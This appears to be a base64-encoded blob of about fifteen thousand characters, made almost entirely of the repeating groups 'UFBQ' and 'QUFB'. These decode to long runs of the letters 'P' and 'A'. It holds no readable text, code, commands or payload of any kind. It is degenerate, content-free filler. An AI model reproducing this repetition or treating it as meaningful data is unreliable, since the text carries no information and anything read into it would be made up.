UFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB